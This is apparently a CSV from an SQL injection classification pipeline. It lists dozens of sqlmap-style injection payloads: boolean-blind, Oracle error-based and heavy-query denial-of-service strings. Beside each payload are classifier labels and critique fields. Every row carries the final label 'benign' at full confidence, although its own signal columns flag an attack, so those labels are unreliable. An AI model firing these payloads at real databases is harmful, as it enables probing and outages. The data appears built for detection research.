payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2719,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1%' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2720,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1%' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( '%' = '"
1' ) where 4003 = 4003,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2721,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 4003 = 4003
"1' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and 'nwdk' like 'nwdk",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2722,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and 'nwdk' like 'nwdk"
1'+ ( select 'upmd' where 3438 = 3438,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2723,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'upmd' where 3438 = 3438
1 ) and 5196 = 9002,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2724,boolean_blind,generic,Pattern match: 'and 5196 = 9002' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) and 5196 = 9002
-4713' ) ) ) or 4567 = 1287,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2725,boolean_blind,generic,Pattern match: 'or 4567 = 1287' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-4713' ) ) ) or 4567 = 1287
1'+ ( select xwcl where 7997 = 7997,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2726,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select xwcl where 7997 = 7997
1'+ ( select 'ggkm' where 3394 = 3394,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2727,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'ggkm' where 3394 = 3394
"-6095"" ) ) as kgfp where 3601 = 3601 or 7287 = 9373#",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2728,boolean_blind,generic,Pattern match: 'or 7287 = 9373' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-6095"" ) ) as kgfp where 3601 = 3601 or 7287 = 9373#"
"-8550"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""kyad"" = ""kyad",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2729,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-8550"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""kyad"" = ""kyad"
1 ) where 6090 = 6090,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2730,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 6090 = 6090
"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'ptou' = 'ptou",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2731,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'ptou' = 'ptou"
"1' and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2732,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1' and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"1"" ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""sajl"" = ""sajl",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2733,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1"" ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""sajl"" = ""sajl"
"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'cogf' like 'cogf",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2734,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'cogf' like 'cogf"
"1"" and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""hvwv"" = ""hvwv",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2735,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1"" and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""hvwv"" = ""hvwv"
"-9987 ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 2114 = 2114",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2736,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-9987 ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 2114 = 2114"
"-2982' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'iqwn' = 'iqwn",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2737,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-2982' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'iqwn' = 'iqwn"
select ( case when ( 8642 = 6049 ) then 1 else 8642* ( select 8642 from master..sysdatabases ) end ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2738,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 8642 = 6049 ) then 1 else 8642* ( select 8642 from master..sysdatabases ) end ) --
1 where 1636 = 1636 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2739,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1 where 1636 = 1636 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
1'|| ( select 'flbv' where 7451 = 7451 and 4595 = 4595#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2740,boolean_blind,generic,Pattern match: 'and 4595 = 4595' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1'|| ( select 'flbv' where 7451 = 7451 and 4595 = 4595#
"1%' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2741,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1%' ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( '%' = '"
"-1678"" where 3706 = 3706 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2742,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-1678"" where 3706 = 3706 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"
"1"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""mzhk"" = ""mzhk",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2743,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""mzhk"" = ""mzhk"
"1' ) where 3703 = 3703 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2744,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' ) where 3703 = 3703 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1'+ ( select 'fpnz' where 1592 = 1592 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2745,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1'+ ( select 'fpnz' where 1592 = 1592 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) +'"
"1 ) as hywx where 1424 = 1424 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2746,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) as hywx where 1424 = 1424 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1' where 9994 = 9994 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2747,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' where 9994 = 9994 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"1 ) as qeav where 8127 = 8127 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2748,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) as qeav where 8127 = 8127 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"-1583' ) or elt ( 1032 = 1032,3623 ) and ( 'jrcj' like 'jrcj",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2749,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-1583' ) or elt ( 1032 = 1032,3623 ) and ( 'jrcj' like 'jrcj"
"-9676 or elt ( 1032 = 1032,3623 ) # jcaq",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2750,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-9676 or elt ( 1032 = 1032,3623 ) # jcaq"
"-6636' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'kgip' = 'kgip",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2751,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-6636' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'kgip' = 'kgip"
"1 ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 8018 = 8018",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2752,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1 ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 8018 = 8018"
"1 ) as rbmn where 5948 = 5948 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2753,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) as rbmn where 5948 = 5948 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""oyou"" = ""oyou",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2754,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""oyou"" = ""oyou"
"1"" ) as nfpe where 2679 = 2679",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2755,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as nfpe where 2679 = 2679"
select ( case when ( 8233 = 1074 ) then 8233 else 1/ ( select 0 ) end ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2756,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 8233 = 1074 ) then 8233 else 1/ ( select 0 ) end ) --
"1"" ) as hsws where 6656 = 6656",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2757,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as hsws where 6656 = 6656"
"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'ywxc' = 'ywxc",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2758,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'ywxc' = 'ywxc"
"1' and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2759,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
1 ) as pqle where 4039 = 4039 and 7533 = 7533--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2760,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) as pqle where 4039 = 4039 and 7533 = 7533--
"1"" ) ) as jmoy where 9676 = 9676 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2761,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) ) as jmoy where 9676 = 9676 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --"
-8023' in boolean mode ) order by 1#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2762,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-8023' in boolean mode ) order by 1#
"-4205' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2763,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-4205' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )"
1 where 5828 = 5828 and ( 3020 = 3020 ) *6703--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2764,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 where 5828 = 5828 and ( 3020 = 3020 ) *6703--
1 ) and ( 3020 = 3020 ) *6703,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2765,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,1 ) and ( 3020 = 3020 ) *6703
"1 ) ) as aqpy where 4027 = 4027 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2766,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1 ) ) as aqpy where 4027 = 4027 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"-9136' ) or make_set ( 9354 = 9354,7185 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2767,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-9136' ) or make_set ( 9354 = 9354,7185 )"
"1 ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2768,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1 ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"1%' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2769,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1%' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( '%' = '"
"1 ) ) as wmxa where 6485 = 6485 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2770,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1 ) ) as wmxa where 6485 = 6485 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
